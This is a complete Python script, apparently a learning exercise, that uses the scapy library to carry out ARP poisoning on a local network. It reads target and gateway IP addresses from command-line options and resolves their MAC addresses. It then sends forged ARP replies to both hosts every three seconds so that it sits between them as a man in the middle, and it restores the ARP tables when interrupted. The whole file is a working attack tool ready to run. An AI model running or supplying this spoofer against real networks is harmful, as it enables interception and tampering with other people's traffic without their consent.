import scapy.all as scapy
import time
import optparse

# Getting User Input
def get_user_input():
    parser_object = optparse.OptionParser()
    parser_object.add_option("-t", "--target",dest="target_ipaddress",help="Target IP address")
    parser_object.add_option("-g", "--gateway",dest="gateway_ipaddress",help="Gateway IP address")

    options =  parser_object.parse_args()[0]

    if not options.target_ipaddress:
        print("Enter Target IP address")

    if not options.gateway_ipaddress:
        print("Enter Gateway IP address")

    return options

# Scan the network for ARP Request
def get_mac_address(ip_range):
    # i) ARP Request
    arp_request_packet = scapy.ARP(pdst=ip_range)
    #scapy.ls(scapy.ARP())

    # ii) Broadcast Request
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())

    # Combining Requests
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

# Spoofing Target IP Address and MAC Address with the Router
def arp_poisoning(target_ip, poisoned_ip):
    target_mac =  get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)
    # scapy.ls(scapy.ARP())

def arp_resetting(original_ip,gateway_ip):
    original_mac = get_mac_address(original_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=original_ip, hwdst=original_mac, psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False,count=6)

# Calling the functions and passing User Input to arp_poisoning and arp_resetting
user_input = get_user_input()
user_target_ip = user_input.target_ipaddress
user_gateway_ip = user_input.gateway_ipaddress

# To eliminate static message in print below
number = 0

try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)

        number += 2
        print("\r Sending ARP Poisoning packets ..." + str(number),end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Exiting ...")
    arp_resetting(user_target_ip, user_gateway_ip)
    arp_resetting(user_gateway_ip, user_target_ip)
